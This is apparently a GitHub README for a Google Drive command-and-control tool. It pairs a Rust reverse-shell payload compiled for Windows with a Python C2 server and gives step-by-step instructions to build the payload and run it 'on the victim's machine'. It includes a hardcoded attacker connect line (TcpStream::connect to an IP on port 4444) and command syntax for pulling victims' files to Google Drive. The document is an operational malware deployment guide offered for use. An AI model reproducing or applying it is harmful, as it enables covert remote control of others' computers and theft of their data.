# Google Drive Command and Control (C2) System

This project provides a Command and Control (C2) system using the Google Drive API and a reverse shell payload written in Rust. The system allows uploading and downloading files to/from Google Drive from a victim's machine and executing commands on the target machine via a C2 server.

# Features
- Reverse shell payload written in Rust
- Upload and download files from the victim's machine to Google Drive
- Command execution on the victim's machine through a TCP connection
- Works with a Google Service Account for authentication
# Prerequisites
- Google Service Account: You need to create a Google Cloud project, enable the Google Drive API, and download the Service Account credentials (JSON).
- Rust Toolchain: Ensure you have Rust installed. If not, install it from Rust's official site.
## Dependencies ðŸ“¦

This Rust project relies on the following dependencies:

- **[yup-oauth2](https://crates.io/crates/yup-oauth2)**  
  Handles authentication with Google OAuth2, allowing the C2 system to interact with Google Drive API using a Service Account.

- **[reqwest](https://crates.io/crates/reqwest)**  
  A popular HTTP client for Rust, used here for sending requests to the Google Drive API for file upload and download functionalities.

- **[tokio](https://crates.io/crates/tokio)**  
  An asynchronous runtime for Rust. It is required by some components of the project (like handling connections) to manage concurrency effectively.

- **[serde](https://crates.io/crates/serde)**  
  A framework for serializing and deserializing data structures in Rust. Essential for converting data to/from JSON format.

- **[serde_json](https://crates.io/crates/serde_json)**  
  A helper crate for `serde` to specifically handle JSON serialization and deserialization.

- **[mime](https://crates.io/crates/mime)**  
  Used for defining file types (MIME types) when uploading files to Google Drive via the API.

### Installing Dependencies
To install the necessary dependencies, simply include them in your `Cargo.toml`:

Make sure to install these by running:
```
cargo build
```
# How to use Rust payload?
1. Setup:
- Place the Google Service Account JSON file in the src/ directory of the Rust project (used in main.rs).
- Update main.rs with your Google Drive folder ID.
2. Compiling the Rust Payload
Before compiling, in src/main.rs (in ```payload``` folder), modify this:
- Set your Google Drive folder ID in ``` const FOLDER_ID: &str = "INPUT YOUR GGDRIVE ID"; ```
- Place your JSON file in /src and update the file name in ```let service_account_json = include_str!("yourjsonfilename.json");```
- Replace your attacker's machine ip + port number at ```let mut stream = TcpStream::connect("192.168.247.131:4444").expect("Failed to connect");```

# Compiling Rust payload
To compile the Rust payload, follow these steps:
```
cd payload
# Build for a Windows target
cargo build --target x86_64-pc-windows-gnu --release
```
<p align="center">
  <img alt="Logo" src="img/cargo-build.jpg" height="100%" width="100%">
</p>
This will generate an .exe file in the target/x86_64-pc-windows-gnu/release folder.

3. Running the C2 Server
On your attacker machine (C2 server), you will run the following Python script to listen for incoming connections and send commands:
```
python3 C2_DriveAPI.py
```
4. Reverse Shell on Victim's Machine
After compiling, transfer the compiled .exe payload to the victim's machine and execute it.

5. Available Commands
- Execute commands: Any system command can be executed as follows:
```
<command>
```
For example:
```
dir
```
- Upload a file to Google Drive:
```
upload;<file_path>
```
For example:
```
upload;C:\Users\Administrator\Documents\example.txt
```
Download a file from Google Drive:
```
download;<file_id>;<local_file_path>
```
For example:
```
download;1vjkwFQJXMpVps5Zd2yD54syoXMEw98Fb;C:\Users\Administrator\Downloads\test.png
```
6. Example C2 Usage
   
  1/ Start the C2 server: Run the c2-server.py script on your attacker machine.
  
  2/ Run the payload: Drop and execute the compiled payload on the victim's machine.
  
  3/ Command execution: After the reverse shell is established, issue commands such as file upload, download, or OS command execution.

## Inspiration & Acknowledgments ðŸ™Œ
This project was inspired by the amazing article "[Hacking Tutorial: Google Sheets Command and Control (C2) Server](https://maxlikessecurity.medium.com/hacking-tutorial-google-sheets-command-and-control-c2-server-999e4dbc89fc)" by Max Likes Security.

Max's work provided the foundation and sparked my interest in building my own version of a Google Drive C2 system. His creativity and insights into using Google services for C2 operations were a huge source of inspiration. ðŸŽ‰
